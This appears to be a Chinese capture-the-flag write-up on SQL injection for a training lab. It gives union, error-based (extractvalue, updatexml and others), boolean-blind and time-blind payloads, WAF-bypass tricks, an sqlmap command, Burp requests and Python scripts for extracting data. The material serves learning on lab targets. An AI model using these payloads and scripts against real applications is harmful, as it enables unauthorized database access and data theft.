---
title: 好靶场SQLi(基础注入/盲注)
published: 2026-09-17T12:00:00
description: 梳理 SQL 注入基础题型，包含报错、联合、布尔、时间盲注，附带 payload、绕过思路与 Python 盲注脚本。
tags:
  - 靶场
  - SQL注入
category: 网络安全
draft: false
---

# 报错注入-sql注入-字符型

```sql
// 判断注入点，观察页面变化，有无报错等回显
admin' and 1=1 #
admin' and 1=2 #

// 探测行数
admin' order by 7 #

// 探测回显位置
admin' union select 1,2,3,4,5,6,7 #

// 获取数据库名(数据库为：sql_injection_lab)
admin' union select 1,2,database(),4,5,6,7 #

// 获取表名(一个user表和flag表)
admin' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='sql_injection_lab' #

// 获取字段名(id、flag)
admin' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag' #

// 获取数据
admin' union select 1,flag,3,4,5,6,7 from flag #
```

# 报错注入-sql注入-数字型

```sql
1 and 1=1
1 and 1=2

1 order by 5

sql_injection_lab
1 union select 1,database(),3,4,5

users,flag
1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='sql_injection_lab'

id,flag
1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag'

1 union select 1,flag,3,4,5 from flag
```

# sql注入-字符型-1

## 一、错误信息

```sql
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '')' at line 1")
```

## 二、如何解读

- `near '')'`：数据库解析到 `'')` 时发现语法错误。
    
- 说明原始 SQL 中，你的输入被包裹在类似 `('...')` 的结构里。
    
- 输入的 `admin'` 提前闭合了字符串，导致后面多出一个 `')` 无法解析。

## 三、推断原始结构

|    错误提示     |     推断原始结构     |     正确闭合     |
| :---------: | :------------: | :----------: |
| `near '')'` |  `('$input')`  | `admin') #`  |
| `near '))'` | `(('$input'))` | `admin')) #` |
| `near "")`  |  `("$input")`  | `admin") #`  |
| `near ')'`  | `($input)` 无引号 |  `admin) #`  |

## 四、闭合步骤

1. 输入 `admin'`，观察是否报错。
    
2. 查看错误信息中 `near` 后面的字符。
    
3. 补全缺失的括号或引号，再用注释符截断剩余部分。
    
4. 发送请求，不再报错即闭合成功。

## 五、常用注释符

- `#`（MySQL/MariaDB）
    
- `--`（后面必须跟一个空格）
    
- `/* */`

## 六、示例

原始结构：`WHERE username = ('$input')`

输入：`admin') #`

替换后：`WHERE username = ('admin') #')`

结果：语法正确，注释掉多余部分。

## 七、一句话总结

**看 `near` 后面是什么，就在输入里补上对应的闭合字符，再用注释符把剩余部分注释掉。**


```sql
1'

1')

1') order by 7 #

1') union select 1,database(),3,4,5,6,7 #

users,flag
1') union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='sql_injection_lab' #

id,flag
1') union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag'#

1') union select 1,flag,3,4,5,6,7 from flag #
```

# SQL报错注入 · 常用函数与Payload速查笔记

## 常用报错函数速查

|            函数             |              报错特征               | 长度限制  | 优先  |
| :-----------------------: | :-----------------------------: | :---: | :-: |
|     `extractvalue()`      |  `XPATH syntax error: '~...'`   | 约32字符 | ★★★ |
|       `updatexml()`       |  `XPATH syntax error: '~...'`   | 约32字符 | ★★★ |
| `floor()+rand()+group by` | `Duplicate entry '...' for key` |  较长   | ★★  |
|          `exp()`          |   `DOUBLE value out of range`   |   中   | ★★  |
|      `GTID_SUBSET()`      |        `GTID_SUBSET` 报错         |   中   |  ★  |
|        `polygon()`        |     `Illegal non geometric`     |   中   |  ★  |

|            函数             |                                     在Payload中的作用                                     |
| :-----------------------: | :----------------------------------------------------------------------------------: |
|     `extractvalue()`      |  接收两个参数，第二个参数被设计成非法XPath。数据库解析失败时，把第二个参数的内容拼进错误信息返回。<br>攻击者把子查询结果放在第二个参数里，数据就随报错回显。  |
|       `updatexml()`       |                     接收三个参数，第二个参数被设计成非法XPath。同上，数据库报错时把第二个参数内容带出。                     |
| `floor()+rand()+group by` | 组合制造主键重复。<br>`floor(rand(0)*2)`在`group by`分组过程中被重复计算，导致临时表主键冲突，报错信息里带上`concat`拼接的数据。 |
|          `exp()`          |         参数被设计成溢出。`~(select ...)`把字符串转成极大数，`exp()`计算结果超出DOUBLE范围，报错时把子查询内容带出。         |
|      `GTID_SUBSET()`      |                 参数被设计成非法GTID格式。<br>数据库校验失败时报错，错误信息包含传入的字符串，数据随报错回显。                  |
|        `polygon()`        |                  参数被设计成非法几何数据。<br>空间函数解析失败时报错，错误信息包含传入的字符串，数据随报错回显。                  |

---

## 各函数Payload模板

### extractvalue

```sql
-- 数据库名
admin' and extractvalue(1,concat(0x7e,database())) #
-- 当前用户
admin' and extractvalue(1,concat(0x7e,user())) #
-- 版本
admin' and extractvalue(1,concat(0x7e,version())) #
-- 表名
admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
-- 字段名
admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'))) #
-- 数据
admin' and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))) #
```

**分段提取：**

```sql
admin' and extractvalue(1,concat(0x7e,substring((select flag from flag limit 0,1),1,32))) #
admin' and extractvalue(1,concat(0x7e,substring((select flag from flag limit 0,1),33,32))) #
```

---

### updatexml

```sql
-- 数据库名
admin' and updatexml(1,concat(0x7e,database()),1) #
-- 表名
admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) #
-- 字段名
admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')),1) #
-- 数据
admin' and updatexml(1,concat(0x7e,(select flag from flag limit 0,1)),1) #
```

**分段提取：**

```sql
admin' and updatexml(1,concat(0x7e,substring((select flag from flag limit 0,1),1,32)),1) #
```

---

### floor + rand + group by

```sql
-- 数据库名
admin' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) #
-- 表名
admin' and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.tables group by x)a) #
-- 数据
admin' and (select 1 from (select count(*),concat((select flag from flag limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #

```

**特点：** 可一次取较长数据，但可能需多次尝试。

---

### exp

```sql
-- 数据库名
admin' and exp(~(select * from(select database())a)) #
-- 版本
admin' and exp(~(select * from(select version())a)) #
-- 表名
admin' and exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a)) #
```

---

### GTID_SUBSET

```sql
-- 数据库名
admin' and GTID_SUBSET(concat(0x7e,database()),1) #
-- 表名
admin' and GTID_SUBSET(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) #
```

---

### polygon

```sql
-- 数据库名
admin' and polygon(concat(0x7e,database())) #
-- 表名
admin' and polygon(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
```

---

## 闭合方式穷举

|      原始结构      |  闭合Payload   |
| :------------: | :----------: |
|   `'$input'`   |  `admin' #`  |
|  `('$input')`  | `admin') #`  |
| `(('$input'))` | `admin')) #` |
|   `"$input"`   |  `admin" #`  |
|  `("$input")`  | `admin") #`  |
| `(("$input"))` | `admin")) #` |

**注释符：** `#`、`--`（空格）、`/* */`

## 实战注意

1.  **优先顺序**：

```
extractvalue → updatexml → floor → exp → GTID_SUBSET → polygon
```

2. **报错无回显**：转布尔盲注 / 时间盲注。

3. **WAF绕过**：

- 大小写混合：`ExTrAcTvAlUe`

- 内联注释：`/*!50000extractvalue*/`

- URL编码：`%27`、`%20`、`%23`

- 空格替换：`/**/`、`+`、`%09`、`%0a`

4. **工具辅助**：

```
sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3 --technique=E --dbms=mysql
```

   `--technique=E`：报错注入。

# sql注入-强制报错注入

```
zhangsan' and extractvalue(1,concat(0x7e,database())) #

zhangsan' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='web'))) #

zhangsan' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='web' and table_name='flag'))) #

flag{875f70bbefb64452a3c2fff8a3d54e54}
zhangsan' and extractvalue(1,concat(0x7e,substr((select flag from flag),1,28))) #
zhangsan' and extractvalue(1,concat(0x7e,substr((select flag from flag),29,28))) #
```

# sql注入-字符型-2

```sql
-- 穷举到双引号，得到数据库 sql_injection_lab
admin" and extractvalue(1,concat(0x7e,database())) #

-- users,flag
admin" and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sql_injection_lab'))) #

-- id,flag
admin" and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag'))) #

-- 一次显示不完全，所以分段提取（根据~后实际显示的字符数为步长） 第1~28字符 flag{68cd802086af4d8489356b8
admin" and extractvalue(1,concat(0x7e,substring((select flag from flag),1,28))) #
-- 第29~38字符（从第29个开始取，实际到结尾） b13fc1115}
admin" and extractvalue(1,concat(0x7e,substring((select flag from flag),29,28))) #
```

# sql注入-POST类型注入-1

一般来说，在POST请求方式下（因为不同于GET，看不到参数），是需要抓包修改请求体中的数据，比如：

- POST的参数在body里，地址栏看不到。
    
- 前端输入框可能对特殊字符做转义、编码、长度限制。
    
- `#`、`'`、空格这些字符必须精确编码，否则注释失效或payload被截断。
    
- 如果有CSRF token、隐藏字段，必须抓包才能看到并一起改。


但是这个靶场貌似不用

```sql
admin' and 1=1 #

admin' order by 7 #

admin' union select 1,database(),3,4,5,6,7 #

admin' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='sql_injection_lab' #

admin' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag' #

admin' union select 1,flag,3,4,5,6,7 from flag #
```

# sql注入-POST类型注入-2

这个同样，但是选择使用报错注入

```sql
admin" and updatexml(1,concat(0x7e,database()),1) #

admin" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sql_injection_lab')),1) #

admin" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag')),1) #

// flag{d7afe487cdac4612aa0d743
admin" and updatexml(1,concat(0x7e,substr((select flag from flag),1,28)),1) #

// 151ad53a3}
admin" and updatexml(1,concat(0x7e,substr((select flag from flag),29,28)),1) #
```

# sql注入-布尔盲注

```python
import requests

base = 'http://xxx.haobachang.com:1234/check?id='
chars = 'qwertyuiopasdfghjklzxcvbnm_0123456789{},'
kw = 'true'

# 通用猜字符串函数
def guess(sql_part, start=1, stop_at_brace=False):
    result = ''
    a = start
    while True:
        found = False
        for b in chars:
            sql = f"1 and (substr(({sql_part}),{a},1)='{b}')"
            payload = base + sql
            content = requests.get(url=payload)
            if kw in content.text:
                result += b
                print("当前:", result)
                found = True
                a += 1
                break
        if not found:
            break
    return result

# 1. 猜库名
print("=== 猜库名 ===")
db = guess("select database()")
print("库名:", db)

# 2. 猜表名
print("=== 猜表名 ===")
tables = guess(f"select group_concat(table_name) from information_schema.tables where table_schema='{db}'")
print("表名:", tables)

# 3. 猜字段名 cols中的table_name需要在上一步跑出来之后，自己指定表名
print("=== 猜字段名 ===")
cols = guess("select group_concat(column_name) from information_schema.columns where table_name='flag'")
print("字段名:", cols)

# 4. 猜 flag 内容
print("=== 猜 flag ===")
inner = guess("select flag from flag limit 0,1", start=6, stop_at_brace=True)
print("flag: flag{" + inner)
```

# sql注入-布尔盲注-1

此题为字符型，注释符号被过滤，所以需要用到`'1' = '1`收尾

```python
import requests
import time

# 基础URL，注意结尾的 1' 和空格
base = "http://xxx.haobachang.com:12138/check?id=1' and "
# 后缀，用来闭合原始SQL剩余部分
suffix = " and '1'='1"
# 判据：页面出现这个字符串就是“真”
kw = "true"
# 请求间隔，防止太快
delay = 0.3
  
def is_true(condition):
    """
    作用：发一个请求，判断条件是否为真。
    参数：condition，条件字符串，比如 "length(database())=17"
    返回：True 表示条件成立，False 表示不成立
    """
    
    # 把 base、condition、suffix 拼成完整 URL
    url = base + condition + suffix
    # 发送 GET 请求
    r = requests.get(url)
    time.sleep(delay)
    # 判断响应里有没有关键字 kw
    return kw in r.text

def get_length(sql):
    """
    作用：猜 sql 查询结果的字符长度。
    参数：sql，子查询，比如 "database()"
    返回：长度（整数）
    """

    # 从 1 试到 19，猜长度
    for n in range(1, 20):
        # 拼出条件：length((sql))=n
        if is_true(f"length(({sql}))={n}"):
            # 为真，返回这个长度
            return n
    # 都没猜中，返回 0
    return 0

def get_char(sql, pos):
    """
    作用：猜 sql 查询结果第 pos 个字符是什么。
    参数：sql 子查询，pos 第几个字符
    返回：该位置的字符
    原理：二分法猜 ASCII 码
    """

    # 可打印 ASCII 范围
    low, high = 32, 126
    # 范围还没缩到一个点
    while low <= high:
        # 取中间值
        mid = (low + high) // 2
        # 拼出条件：第 pos 个字符 ASCII 是否大于 mid
        if is_true(f"ascii(substr(({sql}),{pos},1))>{mid}"):
            # 为真，往右缩
            low = mid + 1
        else:
            # 为假，往左缩
            high = mid - 1
    # low 就是目标 ASCII 码
    return chr(low)

def get_string(sql):
    """
    作用：猜出 sql 查询结果的完整字符串。
    参数：sql，子查询
    返回：完整字符串
    """

    # 先猜长度
    length = get_length(sql)
    print("长度:", length)
    # 准备空字符串
    result = ""
    # 逐字符猜
    for i in range(1, length + 1):
        result += get_char(sql, i)
        print("进度:", result)
    return result

def get_flag(sql):
    """
    作用：猜 flag，已知格式为 flag{}。
    参数：sql，子查询，比如 "select flag from flag limit 0,1"
    返回：flag{...} 完整格式
    原理：跳过 flag{ 这 5 个字符，从第 6 位开始猜，
         遇到 } 停止，不加入结果。
    """

    inner = ""
    pos = 6  # 跳过 flag{ 这 5 个字符
    while True:
        found = False
        # 直接按二分法猜字符，不用先猜长度，遇到 } 自然结束
        c = get_char(sql, pos)
        if c == '}':
            # 遇到右花括号，说明内容结束
            print("进度: " + inner + "}")
            return "flag{" + inner + "}"
        else:
            inner += c
            print("进度:", inner)
            pos += 1
  
# 猜库名
print("=== 猜库名 ===")
db = get_string("database()")
print("库名:", db)

  

# 猜表名
print("=== 猜表名 ===")
tables = get_string(f"select group_concat(table_name) from information_schema.tables where table_schema='{db}'")
print("表名:", tables)

# 猜字段名（假设表名是 flag，如果不是，改成实际表名）
print("=== 猜字段名 ===")
cols = get_string("select group_concat(column_name) from information_schema.columns where table_name='flag'")
print("字段名:", cols)
  
# 猜 flag 数据
print("=== 猜 flag ===")
flag = get_flag("select flag from flag limit 0,1")
print(flag)
```

# sql注入-布尔盲注-2

只是闭合方式不同，此题为`"`，将以上代码中的url以及拼接的闭合部分修改一下符号就可以

# sql注入-时间盲注

### 1. 库

#### 1.1 当前库名长度

```sql
1 AND IF(length(database())=17, SLEEP(5), 0)
```

改数字，直到延迟 5 秒，得到长度。

#### 1.2 当前库名逐字符（二分法）

```sql
1 AND IF(ascii(substr(database(),1,1))>100, SLEEP(5), 0)
```

延迟说明 ASCII > 100，否则 ≤ 100。不断二分确定字符，再改 `substr(...,2,1)` 取第 2 个字符。

#### 1.3 获取所有数据库（可选）

```sql
1 AND IF(length((SELECT schema_name FROM information_schema.schemata LIMIT 0,1))=5, SLEEP(5), 0)
1 AND IF(ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))>100, SLEEP(5), 0)
```

改 `LIMIT 0,1` 为 `LIMIT 1,1` 取下一个库。

---

### 2. 表

假设目标库为 `sql_injection_lab`，也可用 `database()` 代替。

#### 2.1 表数量

```sql
1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sql_injection_lab')=5, SLEEP(5), 0)
```

#### 2.2 第一个表名长度

```sql
1 AND IF(length((SELECT table_name FROM information_schema.tables WHERE table_schema='sql_injection_lab' LIMIT 0,1))=5, SLEEP(5), 0)
```

#### 2.3 第一个表名逐字符

```sql
1 AND IF(ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema='sql_injection_lab' LIMIT 0,1),1,1))>100, SLEEP(5), 0)
```

改 `LIMIT` 偏移获取其他表名。

---

### 3. 字段

假设已得到表名 `users`。当然靶场中要找的是`flag`，这里仅举例。

#### 3.1 字段数量

```sql
1 AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='sql_injection_lab' AND table_name='users')=3, SLEEP(5), 0)
```

#### 3.2 第一个字段名长度

```sql
1 AND IF(length((SELECT column_name FROM information_schema.columns WHERE table_schema='sql_injection_lab' AND table_name='users' LIMIT 0,1))=2, SLEEP(5), 0)
```

#### 3.3 第一个字段名逐字符

```sql
1 AND IF(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema='sql_injection_lab' AND table_name='users' LIMIT 0,1),1,1))>100, SLEEP(5), 0)
```

改 `LIMIT` 偏移获取其他字段。

---

### 4. 数据

假设表 `users`，字段 `username`、`password`。

#### 4.1 行数

```sql
1 AND IF((SELECT COUNT(*) FROM sql_injection_lab.users)=10, SLEEP(5), 0)
```

#### 4.2 第一行 username 长度

```sql
1 AND IF(length((SELECT username FROM sql_injection_lab.users LIMIT 0,1))=5, SLEEP(5), 0)
```

#### 4.3 第一行 username 逐字符

```sql
1 AND IF(ascii(substr((SELECT username FROM sql_injection_lab.users LIMIT 0,1),1,1))>100, SLEEP(5), 0)
```

#### 4.4 获取 password 同理

```sql
1 AND IF(ascii(substr((SELECT password FROM sql_injection_lab.users LIMIT 0,1),1,1))>100, SLEEP(5), 0)
```

取下一行改 `LIMIT 1,1`。

# sql注入-时间盲注

此次使用burp抓包完成

数据库位数

```
GET /check?id=1%20and%20if(length(database())=§1§,sleep(5),0) HTTP/1.1
```

数据库名ascii码

```
GET /check?id=1%20and%20if(ascii(substr(database(),§pos§,1))=§ascii§,sleep(3),0)
```

数据库表数量+表名称位数以及ascii码

```
GET /check?id=1%20and%20if((select%20count(*)%20from%20information_schema.tables%20where%20table_schema='sql_injection_lab')=§num§,sleep(5),0)

# 因为已知两个表，所以我直接跑的第二个表，然后确定位数就是flag无疑，正常情况下位置和位数都需要爆破
GET /check?id=1%20and%20if(length((select%20table_name%20from%20information_schema.tables%20where%20table_schema='sql_injection_lab'%20limit%201,1))=4,sleep(5),0) HTTP/1.1

GET /check?id=1%20and%20if(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema='sql_injection_lab'%20limit%201,1),§1§,1))=§100§,sleep(5),0) HTTP/1.1
```

表字段数量+表字段位数以及ascii码

```
GET /check?id=1%20and%20if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema='sql_injection_lab'%20and%20table_name='flag')=§2§,sleep(5),0) HTTP/1.1

GET /check?id=1%20and%20if(length((select%20column_name%20from%20information_schema.columns%20where%20table_schema='sql_injection_lab'%20and%20table_name='flag'%20limit%20§1§,1))=§2§,sleep(5),0) 

GET /check?id=1%20and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema='sql_injection_lab'%20and%20table_name='flag'%20limit%201,1),§1§,1))=§1§,sleep(5),0) HTTP/1.1
```

数据行数+长度以及ascii码

```
GET /check?id=1%20and%20if((select%20count(*)%20from%20sql_injection_lab.flag)=§1§,sleep(5),0) HTTP/1.1

GET /check?id=1%20and%20if(length((select%20flag%20from%20sql_injection_lab.flag))=§16§,sleep(5),0) HTTP/1.1

GET /check?id=1%20and%20if(ascii(substr((select%20flag%20from%20sql_injection_lab.flag%20limit%200,1),1,1))=1,sleep(3),0) HTTP/1.1
```

# sql注入-时间盲注-1

直接出flag了，只是从数字型变为字符型了

```
1' and sleep(5)#
```

# sql注入-时间盲注-2

也没猜错，只是换了个闭合方式

```
1" and sleep(10) and "1"="1
```